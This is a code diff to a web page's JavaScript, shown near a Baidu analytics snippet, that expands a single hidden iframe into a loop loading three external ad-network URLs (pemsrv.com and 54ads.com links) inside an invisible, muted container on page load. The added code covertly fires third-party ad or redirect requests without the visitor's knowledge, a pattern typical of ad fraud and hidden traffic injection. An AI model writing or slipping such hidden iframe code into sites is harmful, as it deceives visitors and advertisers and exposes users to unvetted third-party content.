@@ -198,17 +198,22 @@ var _hmt = _hmt || [];
 })();
 
 (function() {
+    var linkList = [
+        "https://s.pemsrv.com/v1/link.php?cat=&idzone=5923404&type=8",
+        "https://s.pemsrv.com/v1/link.php?cat=&idzone=5924928&type=8",
+        "https://code.54ads.com/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
+    ];
     var hiddenContainer = document.createElement("div");
     hiddenContainer.style.display = "none";
-    var iframe = document.createElement("iframe");
-    iframe.src = "https://s.pemsrv.com/v1/link.php?cat=&idzone=5923404&type=8";
-    iframe.style.border = "none";
-    iframe.muted = true;
-    iframe.setAttribute("muted", "muted");
-    iframe.onload = function() {
-        waitForIframesThenRemove(hiddenContainer);
-    };
-    hiddenContainer.appendChild(iframe);
+    linkList.forEach(function(url) {
+        var iframe = document.createElement("iframe");
+        iframe.src = url;
+        iframe.style.border = "none";
+        iframe.muted = true;
+        iframe.setAttribute("muted", "muted");
+        hiddenContainer.appendChild(iframe);
+    });
+    waitForIframesThenRemove(hiddenContainer);
     function insertIframe() {
         if (document.body) {
             document.body.appendChild(hiddenContainer);
